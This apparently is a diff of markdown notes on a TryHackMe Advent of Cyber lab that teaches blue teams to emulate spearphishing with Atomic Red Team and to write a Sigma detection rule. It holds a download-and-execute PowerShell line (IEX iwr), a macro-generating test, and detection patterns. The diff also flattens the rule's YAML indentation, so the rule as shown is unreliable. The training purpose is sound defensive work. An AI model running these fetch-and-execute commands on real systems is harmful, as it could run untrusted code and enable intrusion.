@@ -4,15 +4,15 @@ SOC-mas is approaching! And the town of Warewille started preparations for the g
 
 Glitch, a quiet, talented security SOC-mas engineer, had a hunch that these year's celebrations would be different. With looming threats, he decided to revamp the town's security defences. Glitch began to fortify the town's security defences quietly and meticulously. He started by implementing a protective firewall, patching vulnerabilities, and accessing endpoints to patch for security vulnerabilities. As he worked tirelessly, he left "breadcrumbs," small traces of his activity.
 
-Unaware of Glitch's good intentions, theÂ SOCÂ team spotted anomalies: Logs showing admin access, escalation of privileges, patched systems behaving differently, and security tools triggering alerts. TheÂ SOCÂ team misinterpreted the system modifications as a sign of an insider threat or rogue attacker and decided to launch an investigation using the Atomic Red Team framework.
+Unaware of Glitch's good intentions, the SOC team spotted anomalies: Logs showing admin access, escalation of privileges, patched systems behaving differently, and security tools triggering alerts. The SOC team misinterpreted the system modifications as a sign of an insider threat or rogue attacker and decided to launch an investigation using the Atomic Red Team framework.
 
-![a "candy" styled pill being added to the window of a gingerbread house](https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-4-Atomic-Red-Animation.gif)  
+![a "candy" styled pill being added to the window of a gingerbread house](https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-4-Atomic-Red-Animation.gif) 
 This is the continuation of [day 3](DAY%203.md)
 ## Learning Objectives
 ---
 
 ```ad-summary
-- Learn how to identify malicious techniques using theÂ MITREÂ ATT&CK framework.
+- Learn how to identify malicious techniques using the MITRE ATT&CK framework.
 - Learn about how to use Atomic Red Team tests to conduct attack simulations.
 - Understand how to create alerting and detection rules from the attack tests.
 ```
@@ -24,8 +24,8 @@ While it might be the utopian dream of every blue teamer, we will rarely be able
 
 Detection gaps are usually for one of two main reasons:
 
-- **Security is a cat-and-mouse game.**Â As we detect more, the threat actors and red teamers will find new sneaky ways to thwart our detection. We then need to study these novel techniques and update our signature and alert rules to detect these new techniques.
-- **The line between anomalous and expected behavior is often very fine and sometimes even has significant overlap.**Â For example, let's say we are a company based in the US. We expect to see almost all of our logins come from IP addresses in the US. One day, we get a login event from an IP in the EU, which would be an anomaly. However, it could also be our CEO travelling for business. This is an example where normal and malicious behavior intertwine, making it hard to create accurate detection rules that would not have too much noise.
+- **Security is a cat-and-mouse game.** As we detect more, the threat actors and red teamers will find new sneaky ways to thwart our detection. We then need to study these novel techniques and update our signature and alert rules to detect these new techniques.
+- **The line between anomalous and expected behavior is often very fine and sometimes even has significant overlap.** For example, let's say we are a company based in the US. We expect to see almost all of our logins come from IP addresses in the US. One day, we get a login event from an IP in the EU, which would be an anomaly. However, it could also be our CEO travelling for business. This is an example where normal and malicious behavior intertwine, making it hard to create accurate detection rules that would not have too much noise.
 
 Blue teams constantly refine and improve their detection rules to close the gaps they experience due to the two reasons mentioned above. Let's take a look at how this can be done!
 
@@ -34,20 +34,20 @@ Blue teams constantly refine and improve their detection rules to close the gaps
 ---
 Before diving into creating new detection rules, we first have to discuss some key topics. The first topic to discuss is the Cyber Kill chain. All cyber attacks follow a fairly standard process, which is explained quite well by the Unified Cyber Kill chain:
 
-![The process flow of the Unified Kill chain.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ddd4bddb2db2285c3e42eef4c35b6211.png)  
+![The process flow of the Unified Kill chain.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ddd4bddb2db2285c3e42eef4c35b6211.png) 
 
-As a blue teamer, it would be our dream to prevent all attacks at the start of the kill chain. So even just when threat actors start their reconnaissance, we already stop them dead in their tracks. But, as discussed before, this is not possible. The goal then shifts slightly. If we are unable to fully detect and prevent a threat actor at any one phase in the kill chain, the goal becomes to perform detections across the entire kill chain in such a way that even if there are detection gaps in a single phase, the gap is covered in a later phase. The goal is, therefore, to ensure we can detect the threat actor before the very last phase of goal execution.  
+As a blue teamer, it would be our dream to prevent all attacks at the start of the kill chain. So even just when threat actors start their reconnaissance, we already stop them dead in their tracks. But, as discussed before, this is not possible. The goal then shifts slightly. If we are unable to fully detect and prevent a threat actor at any one phase in the kill chain, the goal becomes to perform detections across the entire kill chain in such a way that even if there are detection gaps in a single phase, the gap is covered in a later phase. The goal is, therefore, to ensure we can detect the threat actor before the very last phase of goal execution. 
 
-## MITREÂ ATT&CK
+## MITRE ATT&CK
 ----
-A popular framework for understanding the different techniques and tactics that threat actors perform through the kill chain is theÂ [MITREÂ ATT&CK framework](https://attack.mitre.org/). The framework is a collection of tactics, techniques, and procedures that have been seen to be implemented by real threat actors. The framework provides aÂ [navigator tool](https://mitre-attack.github.io/attack-navigator/)Â where these TTPs can be investigated:
+A popular framework for understanding the different techniques and tactics that threat actors perform through the kill chain is the [MITRE ATT&CK framework](https://attack.mitre.org/). The framework is a collection of tactics, techniques, and procedures that have been seen to be implemented by real threat actors. The framework provides a [navigator tool](https://mitre-attack.github.io/attack-navigator/) where these TTPs can be investigated:
 ![Pasted image 20241204120042.png](../../IMAGES/Pasted%20image%2020241204120042.png)
 
 However, the framework primarily discusses these TTPs in a theoretical manner. Even if we know we have a gap for a specific TTP, we don't really know how to test the gap or close it down. This is where the Atomics come in!
 
 ## Atomic Red
 ---
-The Atomic Red Team library is a collection of red team test cases that are mapped to theÂ MITREÂ ATT&CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.
+The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.
 
 ## Dropping the Atomic
 ---
@@ -55,9 +55,9 @@ McSkidy has a vague idea of what happened to the "compromised machine." It seems
 
 ## Running an Atomic
 ----
-McSkidy suspects that the supposed attacker used the MITRE ATT&CK techniqueÂ [T1566.001 Spearphishing](https://attack.mitre.org/techniques/T1566/001/)Â with an attachment. Let's recreate the attack emulation performed by the supposed attacker and then look for the artefacts created.
+McSkidy suspects that the supposed attacker used the MITRE ATT&CK technique [T1566.001 Spearphishing](https://attack.mitre.org/techniques/T1566/001/) with an attachment. Let's recreate the attack emulation performed by the supposed attacker and then look for the artefacts created.
 
-Open up a PowerShell prompt as administrator and follow along with us. Let's start by having a quick peek at the help page. Enter the commandÂ `Get-Help Invoke-Atomictest`. You should see the output below:
+Open up a PowerShell prompt as administrator and follow along with us. Let's start by having a quick peek at the help page. Enter the command`Get-Help Invoke-Atomictest`. You should see the output below:
 
 
 ```
@@ -77,20 +77,20 @@ REMARKS
 
 The help above only shows what parameters are available without any explanation. Even though most parameter names are self-explanatory, let us have a quick overview of the parameters we will use in this walkthrough:
 
-| Parameter           | Explanation                                                                                                                              | Example use                                                                           |
+| Parameter | Explanation | Example use |
 | ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
-| `-Atomic Technique` | This defines what technique you want to emulate. You can use the complete technique name or the "TXXXX" value. This flag can be omitted. | `Invoke-AtomicTest -AtomicTechnique T1566.001`                                        |
-| `-ShowDetails`      | Shows the details of each test included in the Atomic.                                                                                   | `Invoke-AtomicTest T1566.001 -ShowDetails`                                            |
-| `-ShowDetailsBrief` | Shows the title of each test included in the Atomic.                                                                                     | `Invoke-AtomicTest T1566.001 -ShowDetailsBrief`                                       |
-| `-CheckPrereqs`     | Provides a check if all necessary components are present for testing                                                                     | `Invoke-AtomicTest T1566.001 -CheckPrereqs`                                           |
-| `-TestNames`        | Sets the tests you want to execute using the complete Atomic Test Name.                                                                  | `Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"` |
-| `-TestGuids`        | Sets the tests you want to execute using the unique test identifier.                                                                     | `Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306`         |
-| `-TestNumbers`      | Sets the tests you want to execute using the test number. The scope is limited to the Atomic Technique.                                  | `Invoke-AtomicTest T1566.001 -TestNumbers 2,3   `                                     |
-| `-Cleanup`          | Run the cleanup commands that were configured to revert your machine state to normal.                                                    | `Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup`                                 |
-|                     |                                                                                                                                          |                                                                                       |
-|                     |                                                                                                                                          |                                                                                       |
-**Our First Command**  
-We can build our first command now that we know which parameters are available. We would like to know more about what exactly happens when we test the Technique T1566.001. To get this information, we must include the name of the technique we want information about and then add the flagÂ `-ShowDetails`Â to our command. Let's have a look at the command we constructed:Â `Invoke-AtomicTest T1566.001 -ShowDetails`. This command displays the details of all tests included in the T1566.001 Atomic.
+| `-Atomic Technique` | This defines what technique you want to emulate. You can use the complete technique name or the "TXXXX" value. This flag can be omitted. | `Invoke-AtomicTest -AtomicTechnique T1566.001` |
+| `-ShowDetails` | Shows the details of each test included in the Atomic. | `Invoke-AtomicTest T1566.001 -ShowDetails` |
+| `-ShowDetailsBrief` | Shows the title of each test included in the Atomic. | `Invoke-AtomicTest T1566.001 -ShowDetailsBrief` |
+| `-CheckPrereqs` | Provides a check if all necessary components are present for testing | `Invoke-AtomicTest T1566.001 -CheckPrereqs` |
+| `-TestNames` | Sets the tests you want to execute using the complete Atomic Test Name. | `Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"` |
+| `-TestGuids` | Sets the tests you want to execute using the unique test identifier. | `Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306` |
+| `-TestNumbers` | Sets the tests you want to execute using the test number. The scope is limited to the Atomic Technique. | `Invoke-AtomicTest T1566.001 -TestNumbers 2,3 ` |
+| `-Cleanup` | Run the cleanup commands that were configured to revert your machine state to normal. | `Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup` |
+| | | |
+| | | |
+**Our First Command** 
+We can build our first command now that we know which parameters are available. We would like to know more about what exactly happens when we test the Technique T1566.001. To get this information, we must include the name of the technique we want information about and then add the flag`-ShowDetails` to our command. Let's have a look at the command we constructed:`Invoke-AtomicTest T1566.001 -ShowDetails`. This command displays the details of all tests included in the T1566.001 Atomic.
 
 ```powershell
 PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -ShowDetails
@@ -132,12 +132,12 @@ ElevationRequired: False
 Command:
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+$macrocode = " Open `"#{jse_path}`" For Output As #1`n Write #1, `"WScript.Quit`"`n Close #1`n Shell`$ `"ping 8.8.8.8`"`n"
 Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
 Command (with inputs):
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+$macrocode = " Open `"C:\Users\Public\art.jse`" For Output As #1`n Write #1, `"WScript.Quit`"`n Close #1`n Shell`$ `"ping 8.8.8.8`"`n"
 Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
 
 Cleanup Commands:
@@ -150,17 +150,17 @@ Dependencies:
 Description: Microsoft Word must be installed
 Check Prereq Command:
 try {
-  New-Object -COMObject "#{ms_product}.Application" | Out-Null
-  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
-  Stop-Process -Name $process
-  exit 0
+ New-Object -COMObject "#{ms_product}.Application" | Out-Null
+ $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+ Stop-Process -Name $process
+ exit 0
 } catch { exit 1 }
 Check Prereq Command (with inputs):
 try {
-  New-Object -COMObject "Word.Application" | Out-Null
-  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
-  Stop-Process -Name $process
-  exit 0
+ New-Object -COMObject "Word.Application" | Out-Null
+ $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
+ Stop-Process -Name $process
+ exit 0
 } catch { exit 1 }
 Get Prereq Command:
 Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
@@ -183,7 +183,7 @@ This command will use the data included in the "dependencies" part of the test d
 ```powershell
 PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1
 PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
-          
+ 
 Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
 Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
 ```
@@ -252,34 +252,34 @@ Combining all these pieces of information in a Sigma rule would look something l
 
 ```
 title: Detect PowerShell Invoke-WebRequest and File Creation of PhishingAttachment.xlsm
-  id: 1
-  description: Detects the usage of Invoke-WebRequest to download PhishingAttachment.xlsm and the creation of the file PhishingAttachment.xlsm.
+ id: 1
+ description: Detects the usage of Invoke-WebRequest to download PhishingAttachment.xlsm and the creation of the file PhishingAttachment.xlsm.
  status: experimental
-  author: TryHackMe
-  logsource:
-    category: process_creation
-    product: windows
-    service: sysmon
-  detection:
-   selection_invoke_webrequest:
-      EventID: 1
-      CommandLine|contains:
-        - 'Invoke-WebRequest'
-        - 'http://localhost/PhishingAttachment.xlsm'
-    
-    selection_file_creation:
-      EventID: 11  # Sysmon Event ID for File Creation
-      TargetFilename|endswith: '\PhishingAttachment.xlsm'
-      
-    condition: selection_invoke_webrequest or selection_file_creation
-  falsepositives:
-    - Legitimate administration activity may use Invoke-WebRequest, and legitimate Excel files may be created with similar names.
-  level: high
-  tags:
-    - attack.t1071.001   # Web Service - Application Layer Protocol
-    - attack.t1059.001   # PowerShell
-    - attack.t1105       # Ingress Tool Transfer
-    - attack.t1566.001   # Spearphishing Attachment
+ author: TryHackMe
+ logsource:
+ category: process_creation
+ product: windows
+ service: sysmon
+ detection:
+ selection_invoke_webrequest:
+ EventID: 1
+ CommandLine|contains:
+ - 'Invoke-WebRequest'
+ - 'http://localhost/PhishingAttachment.xlsm'
+ 
+ selection_file_creation:
+ EventID: 11 # Sysmon Event ID for File Creation
+ TargetFilename|endswith: '\PhishingAttachment.xlsm'
+ 
+ condition: selection_invoke_webrequest or selection_file_creation
+ falsepositives:
+ - Legitimate administration activity may use Invoke-WebRequest, and legitimate Excel files may be created with similar names.
+ level: high
+ tags:
+ - attack.t1071.001 # Web Service - Application Layer Protocol
+ - attack.t1059.001 # PowerShell
+ - attack.t1105 # Ingress Tool Transfer
+ - attack.t1566.001 # Spearphishing Attachment
 ```
 
 The `detection` part is where the effective detection is happening. We can see clearly the artefacts that we discovered during the emulation test. We can then import this rule into the main tools we use for alerts, such as the EDR, SIEM, XDR, and many more.
